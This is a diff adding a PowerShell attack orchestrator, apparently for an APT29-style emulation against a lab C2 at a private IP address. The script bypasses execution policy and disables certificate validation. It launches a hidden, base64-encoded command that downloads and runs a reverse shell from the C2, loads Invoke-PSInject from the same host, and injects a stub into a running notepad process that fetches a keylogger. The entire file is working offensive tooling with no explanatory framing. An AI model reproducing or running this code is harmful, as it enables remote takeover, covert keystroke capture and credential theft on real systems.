@@ -1,0 +1,52 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force -EA SilentlyContinue
+[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+[Net.WebRequest]::DefaultWebProxy = $null
+
+$PublicDir = "C:\Users\Public\apt29"
+mkdir $PublicDir -Force -EA SilentlyContinue
+function L($m) { "[$(Get-Date -Format 'HH:mm:ss')] $m" | Out-File "$PublicDir\orchestrator.log" -Append }
+$C2 = "https://192.168.56.100:8443"
+L "ORCH START - PID=$PID"
+
+L "[1] Revshell"
+try {
+    $revPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/revshell.ps1')"
+    $revB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($revPayload))
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP","-Exec","Bypass","-Enc",$revB64
+    L "  OK"
+} catch { L "  FAIL: $_" }
+
+L "[2] Cho notepad"
+$np = $null
+for ($i = 0; $i -lt 30; $i++) {
+    $np = Get-Process notepad -EA SilentlyContinue | Select -First 1
+    if ($np) { break }
+    Start-Sleep -Milliseconds 500
+}
+if (-not $np) { L "  No notepad"; return }
+L "  PID=$($np.Id)"
+
+L "[3] Load Invoke-PSInject"
+try {
+    $wc = New-Object Net.WebClient
+    $wc.Proxy = $null
+    $tool = $wc.DownloadString("$C2/Invoke-PSInject.ps1")
+    L "  Size=$($tool.Length)"
+    Invoke-Expression $tool
+} catch { L "  FAIL: $_"; return }
+
+L "[4] Stub keylogger"
+$stubPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/keylogger.ps1')"
+$StubB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stubPayload))
+if ($StubB64.Length -gt 1200) { L "  Qua dai: $($StubB64.Length)"; return }
+L "  B64=$($StubB64.Length)"
+
+L "[5] Inject"
+try {
+    Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
+    L "  OK"
+} catch { L "  FAIL: $_"; return }
+
+Start-Sleep 3
+L "[6] Notepad alive: $([bool](Get-Process -Id $np.Id -EA SilentlyContinue))"
